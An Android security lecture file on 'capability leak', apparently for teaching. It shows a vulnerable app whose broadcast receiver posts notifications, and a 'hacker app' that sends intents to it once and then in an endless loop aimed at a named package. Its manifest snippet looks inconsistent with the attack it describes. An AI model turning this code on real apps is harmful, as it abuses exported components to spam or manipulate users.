/*
Problem of Capability leak
Malicious application could  use permission of another apps to do privileged actions
Send sms
Get Data
if Exported=Ture , accept intent from other apps
 we will do example showing how Malicious application could send notifcation to user using another app.
 Lecture link
 https://docs.google.com/presentation/d/1o2akCZbVK-i8F1lVddp_uzrdirQDTb7qGOHVazPlhBM/edit?usp=sharing
*/


// App1 have BroadcastReceiver

1- add these lines in manifest.xml
 <service
            android:name=".MyBroadcastReceiver"
            android:exported="false" >
        </service>

2- add service
  public class MyBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
 
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                String mstring = bundle.getString("NewsTitle");
                 NewMessageNotification.notify(context, mstring, 123);
            
            }

    }
}
3- make Notification class by going to (project folder (Res-> new ->UI component-> Notification) and add new class with name NewMessageNotification


//App2 hacker app add there lines

//one time Attack
 final Intent intent=new Intent();
        //intent.setAction("action name");
        intent.putExtra("NewsTitle","test");
        intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
        intent.setComponent(
                new ComponentName("applicationId","Package ID.MyBroadcastReceiver"));
        sendBroadcast(intent);



// Continue attack

    Thread t = new Thread() {
            public void run() {
     while (true){
                final Intent intent=new Intent();
                //intent.setAction("com.pkg.perform.Ruby");
                intent.putExtra("NewsTitle","test");
                intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
                intent.setComponent(
                        new ComponentName("com.ruabye.hussienalrubaye.story","com.example.hussienalrubaye.webview.MyBroadcastReceiver"));
                sendBroadcast(intent);

                try {
                    Thread.sleep(1000);
                }catch (Exception ex){}
            }
            }
        };
        t.start();
